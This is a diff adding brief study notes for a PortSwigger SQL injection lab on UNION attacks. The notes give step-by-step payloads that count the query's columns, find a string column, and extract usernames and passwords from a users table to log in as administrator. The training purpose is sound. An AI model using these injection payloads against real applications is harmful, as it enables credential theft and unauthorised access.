@@ -1,0 +1,18 @@
+Labs:
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+
+End Goal- Output username and password in users table and login as the administrator
+
+select username, password from users;
+
+step 1: Find th enumber of column
+    -> ' order by 1 --
+    -> ' order by 2 --
+
+step 2: Find the column containing string
+    -> 'union select 'null',null --
+    -> 'union select null,'null' --
+
+step 3: finding the username and password from table
+    -> 'union select username, password from users --
+
